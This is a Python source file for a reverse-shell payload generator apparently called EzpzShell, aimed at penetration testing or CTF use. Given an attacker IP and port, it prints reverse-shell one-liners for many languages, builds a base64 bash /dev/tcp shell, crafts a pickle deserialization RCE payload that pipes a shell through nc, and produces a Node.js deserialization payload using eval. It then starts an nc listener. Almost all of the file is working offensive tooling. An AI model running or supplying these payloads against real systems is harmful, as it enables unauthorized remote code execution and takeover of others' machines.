#!/usr/bin/python3
#coding=utf-8

import sys,re,os,base64,pickle
import netifaces as ni
from netifaces import AF_INET, AF_INET6, AF_LINK, AF_PACKET, AF_BRIDGE


class colors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[92m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    RESET = '\033[0m'
    WHITEBOLD = '\033[1m'
    ORANGE = '\033[1;33;40m'
    
def header():
	listPayload = ','.join([i for i in payload.keys()])
	print('''
  ______               _____ _          _ _ 
 |  ____|             / ____| |        | | |
 | |__   _____ __ ___| (___ | |__   ___| | |
 |  __| |_  / '_ \_  /\___ \| '_ \ / _ \ | |
 | |____ / /| |_) / / ____) | | | |  __/ | |
 |______/___| .__/___|_____/|_| |_|\___|_|_|
            | |                             
            |_|'''+f'''\n\n{colors.CYAN}[Payload Available]
{colors.RESET}'''+listPayload+f'''{colors.CYAN}
\n[Usage]\n{colors.ORANGE}python3 {sys.argv[0]} 10.10.10.10 9001 py\n{colors.ORANGE}python3 {sys.argv[0]} tun0 9001 py{colors.RESET}''')

def load_shell():
	listShell = open("/opt/OtherTools/H0j3n/EzpzShell/shell.txt").read()
	for counter,i in enumerate(str(listShell).split("#INDEX")[1:]):
		for j in i.split("#EXAMPLE")[1:]:
			payload[list(payload.keys())[counter]].append(j)
			
def base64gen(ip,port):
	temp = 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'.replace("{IP}",ip).replace("{PORT}",port)
	return base64.b64encode(temp.encode('ascii'))

def pickle_rce(ip,port):
	command = f'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port}' + ' >/tmp/f'
	class rce(object):
		def __reduce__(self):
			import os
			return (os.system,(command,))
	return base64.b64encode(pickle.dumps(rce()))
	
def char_encode(payload):
	encoded_payload = ""
	for char in payload:
		encoded_payload = encoded_payload + "," + str(ord(char))
	return encoded_payload[1:]
	
payload = {
	"py":[],
	"py3":[],
	"bash":[],
	"c":[],
	"nc":[],
	"php":[],
	"perl":[],
	"ruby":[],
	"haskell":[],
	"powershell":[],
	"nodejs":[],
	"awk":[],
	"ncat":[],
	"exe":[],
	"ssti":[],
	"cgibin":[],
	"jenkins":[],
	"tarpriv":[],
	"pickle":[],
	"java":[],
	"lua":[],
	"asp": []
}

if __name__ == "__main__":
	header()
	if len(sys.argv) < 4:
		sys.exit(-1)
	load_shell()
	options = sys.argv[3]
	port = sys.argv[2]
	ip = ""
	try:
		ip = ni.ifaddresses(sys.argv[1])[AF_INET][0]['addr']
	except:
		aa=re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$",sys.argv[1])
		if aa:
			ip = sys.argv[1]
		else:
			print("\nCheck If IP is valid")
			sys.exit(-1)
		
	for counter,j in enumerate(payload[options.lower()]):
		print(f"\n{colors.GREEN}Example {counter+1}{colors.RESET}\n")
		if "{BASE64}" in j:
			temp = base64gen(ip,port)
			print(j.strip().replace("{BASE64}",temp.decode("ascii")))
		elif "{PICKLE}" in j:
			temp = pickle_rce(ip,port)
			print(j.strip().replace("{PICKLE}",temp.decode("ascii")))
		elif "{NODEJS_DESERIALIZATION}" in j:
			temp = j.strip().replace("{NODEJS_DESERIALIZATION}","").replace("{IP}",ip).replace("{PORT}",port).strip()
			temp2 = char_encode(temp)
			print('{"run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % temp2)
			base64payload = '{"run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % temp2
			print(f"\n{base64.b64encode(base64payload.encode('ascii')).decode('ascii')}")
			
		else:
			print(j.strip().replace("{IP}",ip).replace("{PORT}",port))
	print(F"\n{colors.CYAN}[*]{colors.RESET} {colors.WHITEBOLD}Starting the listener on {ip}:{port}\n")
	os.system('nc -lvnp '+ str(port))
	print(colors.RESET)



